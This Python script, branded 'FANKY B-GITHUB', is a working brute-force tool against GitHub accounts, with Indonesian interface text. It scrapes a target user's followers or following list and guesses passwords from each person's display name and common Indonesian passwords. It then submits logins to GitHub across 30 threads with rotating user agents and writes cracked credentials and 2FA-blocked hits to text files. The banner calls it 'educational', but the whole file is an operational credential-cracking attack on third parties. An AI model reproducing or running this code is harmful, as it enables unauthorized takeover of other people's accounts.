import requests, re, time, random, os, uuid, hashlib, datetime
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console
from rich.progress import Progress, TextColumn
from rich.panel import Panel
from rich.columns import Columns

console = Console()
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
]

loop, ok, cp = 0, 0, 0

def generate_headers():
    ua = random.choice(user_agents)
    return {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }

def ambil_user_target(username, mode="followers"):
    hasil = []
    page = 1
    while True:
        url = f"https://github.com/{username}?page={page}&tab={mode}"
        headers = generate_headers()
        r = requests.get(url, headers=headers)
        if r.status_code != 200:
            break
        userlist = re.findall(r'data-hovercard-url="/users/(.*?)/hovercard"', r.text)
        if not userlist:
            break
        hasil.extend(userlist)
        page += 1
    return list(set(hasil))

def gen_password(nmf):
    pwv = ["Indonesia123", "Bismillah123", "Sayangku123"]
    nmf = nmf.lower()
    frs = nmf.split(" ")[0]
    tahun = [str(i) for i in range(2000, 2011)]
    angka = [f"0{i}" for i in range(1, 7)]
    if len(frs) >= 3:
        pwv.extend([nmf, frs+"123", frs+"321"] + [frs+t for t in tahun] + [frs+a for a in angka])
        pwv.append(frs.capitalize() + "123")
    return list(set(pwv))

def brute_github(idf, pwv, prog, task, total):
    global loop, ok, cp
    session = requests.Session()
    prog.update(task, description=f" [bold green]github [bold white]{idf} [bold blue] {loop}/{total} [bold green]OK: {ok} [bold yellow]CP: {cp}")
    prog.advance(task)
    for pw in pwv:
        try:
            headers = generate_headers()
            login_page = session.get("https://github.com/login", headers=headers).text
            token = re.search(r'name="authenticity_token" value="(.*?)"', login_page)
            if not token:
                continue
            data = {
                'commit': 'Sign in',
                'authenticity_token': token.group(1),
                'login': idf,
                'password': pw,
                'webauthn-support': 'supported',
                'webauthn-iuvpaa-support': 'unsupported',
                'return_to': 'https://github.com/login',
                'allow_signup': '',
                'client_id': '',
                'integration': ''
            }
            res = session.post("https://github.com/session", headers=headers, data=data, allow_redirects=False)
            if "location" in res.headers:
                if "github.com/sessions/" in res.headers["location"]:
                    cp += 1
                    console.print(f"[yellow][2FA] {idf}|{pw}")
                    open("CP.txt", "a").write(f"{idf}|{pw}\n")
                elif "github.com/" in res.headers["location"]:
                    ok += 1
                    console.print(f"[green][OK] {idf}|{pw}")
                    open("OK.txt", "a").write(f"{idf}|{pw}\n")
                    break
                else:
                    continue
        except requests.exceptions.RequestException:
            time.sleep(10)
    loop += 1

def metslow(id2):
    global loop, ok, cp
    console.print(Panel("🚀 [bold cyan]CRACKING DIMULAI...", title="[bold magenta]FANKY B-GITHUB"))
    with Progress(TextColumn("{task.description}")) as prog:
        task = prog.add_task("", total=len(id2))
        with tred(max_workers=30) as pool:
            for user in id2:
                idf, nmf = user.split("|")
                pwv = gen_password(nmf)
                pool.submit(brute_github, idf, pwv, prog, task, len(id2))

def main():
    target = input("👤 Target GitHub: ").strip()
    print("1. Followers\n2. Following")
    pilihan = input("📌 Pilih 1 atau 2: ").strip()
    mode = "followers" if pilihan == "1" else "following"
    users = ambil_user_target(target, mode)
    console.print(f"\n📋 Total akun ditemukan: [bold cyan]{len(users)}[/bold cyan]\n")

    print("\n1. Brute semua akun\n2. Pilih akun tertentu")
    mode_brute = input("📌 Pilih mode (1/2): ").strip()
    print("mohom bersabar sedang proses")
    id2 = []
    for u in users:
        try:
            res = requests.get(f"https://github.com/{u}", headers=generate_headers())
            name = re.search(r'<span class="p-name[^>]*?">(.*?)</span>', res.text)
            nama = name.group(1).strip() if name else u
            id2.append(f"{u}|{nama}")
        except:
            continue

    if mode_brute == "2":
        nomor = int(input("Masukkan nomor akun target: ")) - 1
        id2 = [id2[nomor]]

    metslow(id2)


from rich.console import Console
from rich.panel import Panel
import os

console = Console()

def banner():
    os.system("clear" if os.name != "nt" else "cls")
    teks = """[bold cyan]🔐 FANKY B-GITHUB

Brute-force edukatif GitHub
Developer: fanky (garuda phantom)
GitHub: github.com/fanky86
Website: fankyxd.xyz[/bold cyan]"""
    console.print(Panel(teks, width=60, border_style="cyan"))

if __name__ == "__main__":
    banner()
    main()

